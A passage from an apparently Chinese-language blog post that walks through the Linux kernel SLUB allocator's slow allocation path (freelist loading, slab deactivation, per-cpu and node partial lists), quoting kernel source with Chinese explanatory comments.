class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">redo:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!node_match(slab, node))) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment"> * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!node_isset(node, slab_nodes)) {</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By rights, we should be searching for a slab page that was</span></span><br><span class="line"><span class="comment"> * PFMEMALLOC but right now, we are losing the pfmemalloc</span></span><br><span class="line"><span class="comment"> * information when the page leaves the per-cpu allocator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must check again c-&gt;slab in case we got preempted and it changed */</span></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//kmem_cache_cpu中freelist为空,尝试从kmem_cache_cpu-&gt;slab中获取freelist</span></span><br><span class="line">freelist = get_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="comment">//若还是未取到,说明当前正在使用的slab是满的,尝试获取新的slab.</span></span><br><span class="line"><span class="keyword">if</span> (!freelist) {</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, DEACTIVATE_BYPASS);</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_REFILL);</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 检查slab的空闲链表并决定要么将其转移</span></span><br><span class="line"><span class="comment"> * 到per cpu空闲链表中,要么对该slab进行deactivate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 若返回值非空则该slab仍处于冻结状态</span></span><br><span class="line"><span class="comment"> * 若返回值为空则该slab已经解冻.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">get_freelist</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="type">void</span> *freelist;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">counters = slab-&gt;counters;</span><br><span class="line"></span><br><span class="line">new.counters = counters;</span><br><span class="line">VM_BUG_ON(!new.frozen);</span><br><span class="line"></span><br><span class="line">new.inuse = slab-&gt;objects;</span><br><span class="line">new.frozen = freelist != <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">} <span class="keyword">while</span> (!__slab_update_freelist(s, slab,</span><br><span class="line">freelist, counters,</span><br><span class="line"><span class="literal">NULL</span>, new.counters,</span><br><span class="line"><span class="string">"get_freelist"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="load-freelist"><a href="#load-freelist" class="headerlink" title="load_freelist"></a>load_freelist</h4><p>这一模块是用来处理通过各种途径后已经获取到freelist之后的逻辑.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 装载freelist链表,更新kmem_cache-&gt;freelist为空闲对象</span></span><br><span class="line"><span class="comment">* 链表中第二个对象,返回当前空闲对象中第一个对象(因为本次</span></span><br><span class="line"><span class="comment">* __alloc_slab会直接分配一个对象).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">load_freelist:</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment"> * slab is pointing to the slab from which the objects are obtained.</span></span><br><span class="line"><span class="comment"> * That slab must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">VM_BUG_ON(!c-&gt;slab-&gt;frozen);</span><br><span class="line">c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取该@object对应freelist中下一个对象的地址.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">get_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ptr_addr;</span><br><span class="line"><span class="type">freeptr_t</span> p;</span><br><span class="line"></span><br><span class="line">object = kasan_reset_tag(object);</span><br><span class="line"><span class="comment">//freelist的指针在object中有一个kmem_cache-&gt;offset的偏移</span></span><br><span class="line">ptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line">p = *(<span class="type">freeptr_t</span> *)(ptr_addr);</span><br><span class="line"><span class="keyword">return</span> freelist_ptr_decode(s, p, ptr_addr);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="deactivate-slab"><a href="#deactivate-slab" class="headerlink" title="deactivate_slab"></a>deactivate_slab</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 将kmem_cache_cpu-&gt;slab-&gt;freelist合并连接到</span></span><br><span class="line"><span class="comment">* kmem_cache_cpu-&gt;freelist之后,解冻slab并根据合并后</span></span><br><span class="line"><span class="comment">* slab情况放入对应的kmem_cache_node的partial/full</span></span><br><span class="line"><span class="comment">* 链表中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">deactivate_slab:</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="comment">//处理并发问题</span></span><br><span class="line"><span class="keyword">if</span> (slab != c-&gt;slab) {</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">deactivate_slab(s, slab, freelist);</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 结束移除cpu slab的操作.将cpu的空闲链表和slab</span></span><br><span class="line"><span class="comment"> * 的空闲链表合并,解冻slab并放到正确的链表中.</span></span><br><span class="line"><span class="comment"> * 假设slab已经被调用者安全的从kmem_cache_cpu中移除</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deactivate_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *freelist)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> {</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST };</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, slab_nid(slab));</span><br><span class="line"><span class="type">int</span> free_delta = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> <span class="title">mode</span> =</span> M_NONE;</span><br><span class="line"><span class="type">void</span> *nextfree, *freelist_iter, *freelist_tail;</span><br><span class="line"><span class="type">int</span> tail = DEACTIVATE_TO_HEAD;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;freelist) {</span><br><span class="line">stat(s, DEACTIVATE_REMOTE_FREES);</span><br><span class="line">tail = DEACTIVATE_TO_TAIL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage one: Count the objects on cpu's freelist as free_delta and</span></span><br><span class="line"><span class="comment"> * remember the last object in freelist_tail for later splicing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist_tail = <span class="literal">NULL</span>;</span><br><span class="line">freelist_iter = freelist;</span><br><span class="line"><span class="keyword">while</span> (freelist_iter) {</span><br><span class="line">nextfree = get_freepointer(s, freelist_iter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If 'nextfree' is invalid, it is possible that the object at</span></span><br><span class="line"><span class="comment"> * 'freelist_iter' is already corrupted.  So isolate all objects</span></span><br><span class="line"><span class="comment"> * starting at 'freelist_iter' by skipping them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">freelist_tail = freelist_iter;</span><br><span class="line">free_delta++;</span><br><span class="line"></span><br><span class="line">freelist_iter = nextfree;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage two: Unfreeze the slab while splicing the per-cpu</span></span><br><span class="line"><span class="comment"> * freelist to the head of slab's freelist.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Ensure that the slab is unfrozen while the list presence</span></span><br><span class="line"><span class="comment"> * reflects the actual number of objects during unfreeze.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We first perform cmpxchg holding lock and insert to list</span></span><br><span class="line"><span class="comment"> * when it succeed. If there is mismatch then the slab is not</span></span><br><span class="line"><span class="comment"> * unfrozen and number of objects in the slab may have changed.</span></span><br><span class="line"><span class="comment"> * Then release lock and retry cmpxchg again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">old.freelist = READ_ONCE(slab-&gt;freelist);</span><br><span class="line">old.counters = READ_ONCE(slab-&gt;counters);</span><br><span class="line">VM_BUG_ON(!old.frozen);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Determine target state of the slab */</span></span><br><span class="line">new.counters = old.counters;</span><br><span class="line"><span class="keyword">if</span> (freelist_tail) {</span><br><span class="line">new.inuse -= free_delta;</span><br><span class="line">set_freepointer(s, freelist_tail, old.freelist);</span><br><span class="line">new.freelist = freelist;</span><br><span class="line">} <span class="keyword">else</span></span><br><span class="line">new.freelist = old.freelist;</span><br><span class="line"></span><br><span class="line">new.frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) {</span><br><span class="line">mode = M_FREE;</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (new.freelist) {</span><br><span class="line">mode = M_PARTIAL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Taking the spinlock removes the possibility that</span></span><br><span class="line"><span class="comment"> * acquire_slab() will see a slab that is frozen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">mode = M_FULL_NOLIST;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!slab_update_freelist(s, slab,</span><br><span class="line">old.freelist, old.counters,</span><br><span class="line">new.freelist, new.counters,</span><br><span class="line"><span class="string">"unfreezing slab"</span>)) {</span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL)</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL) {</span><br><span class="line">add_partial(n, slab, tail);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, tail);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FREE) {</span><br><span class="line">stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FULL_NOLIST) {</span><br><span class="line">stat(s, DEACTIVATE_FULL);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="new-slab"><a href="#new-slab" class="headerlink" title="new_slab"></a>new_slab</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 尝试从kmem_cache_cpu-&gt;partial中获取slab并</span></span><br><span class="line"><span class="comment">* 设置为kmem_cache_cpu-&gt;slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slub_percpu_partial(c)) {</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) {</span><br><span class="line"><span class="comment">//处理并发问题</span></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slub_percpu_partial(c))) {</span><br><span class="line"><span class="comment">//处理并发问题</span></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="comment">/* we were preempted and partial list got empty */</span></span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">slab = c-&gt;slab = slub_percpu_partial(c);</span><br><span class="line">slub_set_percpu_partial(c, slab); <span class="comment">//更新partial链表</span></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> slub_percpu_partial(c)((c)-&gt;partial)</span></span><br></pre></td></tr></tbody></table></figure><h4 id="new-objects"><a href="#new-objects" class="headerlink" title="new_objects"></a>new_objects</h4><p>如果从kmem_cache_cpu-&gt;partial获取slab失败,则回退到kmem_cache_node进行获取.<br>首先尝试从kmem_cache_node-&gt;partial中获取slab.若失败则调用new_slab函数(注意与上面的new_slab label不是一个东西)向budy system申请新的slab.<br>两种方式获取到的slab都设为full状态并冻结,方便之后装载到kmem_cache_cpu-&gt;slab.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 尝试从kmem_cache_node-&gt;partial中获取slab.</span></span><br><span class="line"><span class="comment">* 若失败则调用new_slab向budy system申请新的slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">new_objects:</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">freelist = get_partial(s, node, &amp;pc);</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> check_new_slab;</span><br><span class="line"></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) {</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLAB);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) {</span><br><span class="line">freelist = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!freelist))</span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * No other reference to the slab yet so we can</span></span><br><span class="line"><span class="comment"> * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">slab-&gt;inuse = slab-&gt;objects;</span><br><span class="line">slab-&gt;frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新kmem_cache_node-&gt;nr_slabs,total_objects</span></span><br><span class="line">inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);</span><br></pre></td></tr></tbody></table></figure><p>get_partial函数首先尝试get_partial_node从当前的kmem_cache_node中分配slab,若失败且node指定为NUMA_NO_NODE,则进行get_any_partial搜索其他的kmem_cache_node进行分配.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a partial slab, lock it and return it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">get_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> node, <span class="keyword">struct</span> partial_context *pc)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *object;</span><br><span class="line"><span class="type">int</span> searchnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">searchnode = numa_mem_id();</span><br><span class="line"></span><br><span class="line">object = get_partial_node(s, get_node(s, searchnode), pc);</span><br><span class="line"><span class="keyword">if</span> (object || node != NUMA_NO_NODE)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_any_partial(s, pc);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 